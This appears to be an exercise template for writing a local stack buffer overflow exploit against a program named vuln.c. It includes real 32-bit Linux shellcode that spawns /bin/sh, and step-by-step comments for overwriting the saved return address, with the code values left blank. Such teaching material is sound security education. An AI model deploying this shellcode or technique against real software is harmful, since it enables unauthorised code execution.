#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Template local exploit for vuln.c

import struct
import sys

# Direct execution of the program to these bytes, and you'll get a shell
SHELLCODE = ("\x31\xc0\x50\x68\x2f" +
             "\x2f\x73\x68\x68\x2f" +
             "\x62\x69\x6e\x89\xe3" +
             "\x50\x53\x89\xe1\x89" +
             "\xc2\xb0\x0b\xcd\x80")

def pack(addr):
    ''' Use this function to convert a numerical address (ex: 0xffffd870)
    into its little-endian representation we'll place in memory ('\x70\xd8\xff\xff')
    '''

    return struct.pack('<I', addr)

# In this script, we'll be creating a malformed buffer that will
# exploit the stack buffer overflow vuln when we provide it as input to
# the vuln program.

# How many bytes do we have on the stack before the saved ebp and eip?
bufsize =

# What is the address of our shellcode in memory that we want to direct
# executin to?
shellcode_addr =

# Step 1: Create a string variable containing shellcode
exploit_buffer =

# Step 2: Append some 'A's to pad to the rest of the buffer. The number of 'A's
# you want is the bufsize minus the length of the shellcode.
exploit_buffer +=

# Step 3: Append some B's to account for the saved ebp. The number of 'B's
# you want is the number of bytes the saved ebp takes up on the stack.
exploit_buffer +=

# Step 4: Append the address of the shellcode (shellcode_addr). This will
# overwrite the saved eip on the stack! Remember you need to convert that
# integer variable into a little-endian string. You can use the pack() function
# for this
exploit_buffer +=

# We're going to pipe the output of this program into the input of the vuln
# program, so just write the exploit_buffer to stdout
#
# Tip: Don't use `print`, it adds extra newline bytes and stuff. Use sys.stdout
# instead to be precisely sure what bytes we are outputting.
sys.stdout
